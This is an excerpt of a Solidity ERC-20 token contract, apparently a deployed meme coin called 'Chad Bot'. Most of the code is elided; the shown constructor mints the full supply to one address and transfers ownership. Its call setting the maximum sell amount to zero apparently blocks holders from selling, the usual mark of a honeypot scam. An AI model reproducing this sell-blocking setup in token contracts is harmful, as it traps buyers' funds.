...
// File: mainnet/0xD5C8D23Fef5FC618Db38DA6df6A750Aa2529197D/Token.sol



pragma solidity 0.8.19;

contract Troz is ERC20, ERC20Burnable, Ownable {
    ...
    constructor()
        ERC20(unicode"Chad Bot", unicode"HarryTrumpGremlinsPotterInuBot") 
    {
        address supplyRecipient = 0x536A58B94677822572E749fdC3111a96eB1e55A0;
        ...
        setMaxSellAmount(0 * (10 ** decimals()));
        setMaxTransferAmount(10000 * (10 ** decimals()));

        _mint(supplyRecipient, 100_000_000_000 * (10 ** decimals()));
        _transferOwnership(0x360905d62e3d11E2f8695187D5407B1a46FD2268);
    }
